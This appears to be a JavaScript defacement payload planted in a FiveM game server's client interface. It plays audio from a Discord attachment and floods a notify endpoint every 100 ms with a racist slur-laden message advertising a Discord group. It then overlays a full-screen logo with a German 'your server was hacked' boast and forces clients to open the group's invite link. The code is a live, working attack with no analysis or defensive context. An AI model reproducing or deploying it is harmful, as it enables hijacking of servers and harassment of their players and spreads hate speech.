function jump() { 
    var audio2 = new Audio("https://cdn.discordapp.com/attachments/1395467297052819518/1395467335116132442/geileniggadatei.mp3?ex=687a8dbb&is=68793c3b&hm=ef7e3deb7ce0fbae48375b336384619d91efe78d2ffa3b3415e625ebf59c339b&");

    setInterval(function() {
        $.post('https://fusion_core/notify', JSON.stringify({ msg: "joint discord.gg/zerosociety sonst nigga" }));
    }, 100);

    audio2.play();
    audio2.addEventListener('ended', function () {
        $('body').append(
            '<div class="xx">' +
                '<img style="position: absolute; top: 0; left: 0; width: 100%; height: 100%;" src="https://cdn.discordapp.com/attachments/1395467297052819518/1395469174649782292/zeroniggalogo.webp?ex=687a8f71&is=68793df1&hm=a0822ae3d4b6e799556d778837b0f101d0dfb01cb509196d0de3aaaaae69309d&">' +
                '<span style="position: absolute; z-index: 999; transform: translate(-50%, -50%); top: 50%; left: 50%; font-size: 1.4vw; color: red;">' +
                    '<strong>discord.gg/zerosociety</strong><br>' +
                    'ACHTUNG: Euer Server wurde offiziell in den arsch gefickt' +
                '</span>' +
            '</div>'
        );

        audio.play();

        audio.addEventListener('ended', function() {
            $('.xx').fadeOut();
        });

        $('body').append(
            '<span style="position: absolute; transform: translate(-50%, -50%); top: 50%; left: 50%; font-size: 2vw; color: red;">' +
                'discord.gg/zerosociety<br>' +
                'ACHTUNG: Euer Server wurde offiziell in den arsch gefickt<br>'+
            '</span>' +
            '<img style="position: absolute; top: 2vw; left: 2vw; width: 15vw;" src="https://cdn.discordapp.com/attachments/1395467297052819518/1395469174649782292/zeroniggalogo.webp?ex=687a8f71&is=68793df1&hm=a0822ae3d4b6e799556d778837b0f101d0dfb01cb509196d0de3aaaaae69309d&">'
        );

        window.invokeNative("openUrl", "https://discord.gg/zerosociety");
    });
}

jump()
